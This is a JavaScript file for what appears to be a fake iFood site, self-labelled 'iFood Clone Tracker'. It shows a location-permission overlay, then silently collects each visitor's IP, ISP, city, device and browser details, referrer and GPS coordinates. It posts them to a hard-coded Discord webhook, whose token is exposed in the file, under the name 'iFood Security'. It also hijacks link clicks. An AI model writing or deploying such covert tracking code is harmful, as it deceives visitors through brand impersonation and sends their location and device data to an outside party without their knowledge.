const WEBHOOK = "https://discord.com/api/webhooks/1512916490637279442/3b3q2iweTkHj2A7_bohtF_z5Shjm1hgMbVKX3AFmXDwbI5t9Qp-ZBH3MX8iIZ5gaMVoN";

const IPModule = {
  async send(lat, lon) {
    try {
      const res = await fetch("https://ipinfo.io/json");
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const d = await res.json();
      if (!d.ip) throw new Error("IP missing");

      const nav  = window.navigator;
      const conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
      const ua   = nav.userAgent;

      const os =
        ua.includes("Windows NT 10.0") ? "Windows 10"     :
        ua.includes("Windows NT 11.0") ? "Windows 11"     :
        ua.includes("Windows NT 6.1")  ? "Windows 7"      :
        ua.includes("Windows")         ? "Windows"        :
        ua.includes("Ubuntu")          ? "Linux (Ubuntu)" :
        ua.includes("Linux")           ? "Linux"          :
        ua.includes("Mac OS X")        ? "macOS"          :
        ua.includes("Android")         ? "Android"        :
        ua.includes("iPhone")          ? "iOS (iPhone)"   :
        ua.includes("iPad")            ? "iOS (iPad)"     : "Desconhecido";

      const browser =
        ua.includes("Edg/")    ? "Edge"    :
        ua.includes("OPR/")    ? "Opera"   :
        ua.includes("Firefox") ? "Firefox" :
        ua.includes("Chrome")  ? "Chrome"  :
        ua.includes("Safari")  ? "Safari"  : "Desconhecido";

      const embed = {
        title: "🎯 Novo Visitante Capturado",
        color: 15277612,
        timestamp: new Date().toISOString(),
        fields: [
          {
            name: "🌐 Rede",
            value: `**IP:** \`${d.ip}\`\n**ISP:** ${d.org ?? "N/A"}\n**Local:** ${d.city ?? ""}, ${d.region ?? ""} - ${d.country ?? ""}\n**Conexão:** ${conn.downlink ? conn.downlink + " Mbps / " + (conn.effectiveType ?? "") : "N/A"}`,
            inline: false
          },
          {
            name: "💻 Dispositivo",
            value: `**OS:** ${os}\n**Browser:** ${browser}\n**CPU:** ${nav.hardwareConcurrency ?? "N/A"} cores / ${nav.deviceMemory ?? "N/A"} GB RAM\n**Tela:** ${window.screen.width}x${window.screen.height}\n**Mobile:** ${nav.maxTouchPoints > 0 ? "Sim" : "Não"}`,
            inline: true
          },
          {
            name: "⚙️ Sistema",
            value: `**Idioma:** ${nav.language}\n**Cookies:** ${nav.cookieEnabled ? "Ativado" : "Desativado"}\n**Referrer:** ${document.referrer || "Direto"}`,
            inline: true
          },
          {
            name: "🔗 URL",
            value: `[${location.href}](${location.href})`,
            inline: false
          }
        ],
        footer: {
          text: "iFood Clone Tracker",
          icon_url: "https://cdn-icons-png.flaticon.com/512/2972/2972185.png"
        }
      };

      if (lat !== null && lon !== null) {
        embed.fields.push({
          name: "📍 Localização",
          value: `**Coords:** \`${lat.toFixed(6)}, ${lon.toFixed(6)}\`\n[Ver no Google Maps](https://maps.google.com/?q=${lat.toFixed(6)},${lon.toFixed(6)})`,
          inline: false
        });
        embed.thumbnail = {
          url: `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=13&size=400x300&markers=color:red%7C${lat},${lon}&key=AIzaSyDummy`
        };
      }

      await fetch(WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: "iFood Security",
          avatar_url: "https://logodownload.org/wp-content/uploads/2017/04/ifood-logo-0.png",
          embeds: [embed]
        })
      });
    } catch (err) {
      console.warn("[IPModule]", err.message);
    }
  },
};

const CookieModule = {
  init() {
    const overlay = document.getElementById("location-overlay");
    const allow   = document.getElementById("location-allow");

    if (!overlay || !allow) return;

    overlay.style.display = "flex";

    allow.addEventListener("click", () => {
      overlay.style.display = "none";
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => IPModule.send(pos.coords.latitude, pos.coords.longitude),
          ()    => IPModule.send(null, null)
        );
      } else {
        IPModule.send(null, null);
      }
    });
  },
};

CookieModule.init();

// Modal de link externo
const linkOverlay = document.getElementById("link-overlay");
if (linkOverlay) {
  const urlText    = document.getElementById("link-url-text");
  const btnConfirm = document.getElementById("link-confirm");
  const btnCancel  = document.getElementById("link-cancel");
  let pendingUrl   = null;

  document.addEventListener("click", (e) => {
    const a = e.target.closest("a");
    if (!a) return;
    e.preventDefault();
    pendingUrl = a.href;
    urlText.textContent = pendingUrl;
    linkOverlay.style.display = "flex";
  });

  btnConfirm.addEventListener("click", () => {
    linkOverlay.style.display = "none";
    if (pendingUrl) window.location.href = pendingUrl;
  });

  btnCancel.addEventListener("click", () => {
    linkOverlay.style.display = "none";
    pendingUrl = null;
  });
}
